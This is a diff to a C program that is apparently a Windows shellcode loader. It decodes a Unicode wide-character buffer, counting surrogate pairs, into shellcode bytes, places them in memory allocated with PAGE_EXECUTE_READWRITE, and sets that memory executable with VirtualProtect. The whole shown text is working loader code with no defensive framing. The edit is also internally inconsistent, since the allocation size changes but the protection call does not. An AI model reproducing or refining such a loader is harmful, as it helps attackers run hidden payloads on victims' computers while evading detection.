@@ -29,9 +29,11 @@ int main(int argc, char* argv[]) {
     size_t len = 0;
     for (wchar_t* p = wide_buffer; *p; ++p) {
         if ((*p >= 0xD800) && (*p <= 0xDBFF)) {
-            ++p;
+            ++p; // Skip low surrogate
+            len++; // Count surrogate pair as ONE byte
+        } else {
+            len++; // Count regular character as ONE byte
         }
-        len++;
     }
     
     unsigned char* shellcode = malloc(len);
@@ -60,8 +62,8 @@ int main(int argc, char* argv[]) {
     }
     printf("\n\n");
     
-    void* exec_mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    memcpy(exec_mem, shellcode, len);
+    void* exec_mem = VirtualAlloc(NULL, shellcode_index, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(exec_mem, shellcode, shellcode_index);
     
     DWORD old_protect;
     VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &old_protect);
